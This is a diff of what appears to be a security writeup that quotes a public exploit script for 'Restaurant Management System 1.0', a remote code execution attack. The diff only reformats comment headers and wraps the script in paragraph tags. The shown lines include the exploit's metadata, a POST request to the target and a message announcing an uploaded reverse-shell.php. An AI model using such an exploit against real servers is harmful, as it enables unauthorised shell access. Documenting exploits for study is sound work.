@@ -11,15 +11,15 @@ style="width:4.675in;height:1.53333in" />
 <img src="Zeno/media/image3.png"
 style="width:5.95833in;height:1.08333in" />
 
-correct code::
+<p>correct code::
 
-# Exploit Title: Restaurant Management System 1.0  - Remote Code Execution
-# Date: 2019-10-16
-# Exploit Author: Ibad Shah
-# Vendor Homepage: https://www.sourcecodester.com/users/lewa
-# Software Link: https://www.sourcecodester.com/php/11815/restaurant-management-system.html
-# Version: N/A
-# Tested on: Apache 2.4.41
+#Exploit Title: Restaurant Management System 1.0  - Remote Code Execution
+#Date: 2019-10-16
+#Exploit Author: Ibad Shah
+#Vendor Homepage: https://www.sourcecodester.com/users/lewa
+#Software Link: https://www.sourcecodester.com/php/11815/restaurant-management-system.html
+#Version: N/A
+#Tested on: Apache 2.4.41
 
 #!/usr/bin/python
 
@@ -83,7 +83,7 @@ r = requests.post(target,verify=False, headers=headers,data=data)
 
 print("[+] Shell Uploaded. Please check the URL : "+url+"images/reverse-shell.php")
 
-
+</p>
 
 <img src="Zeno/media/image4.png"
 style="width:6.63333in;height:3.175in" />
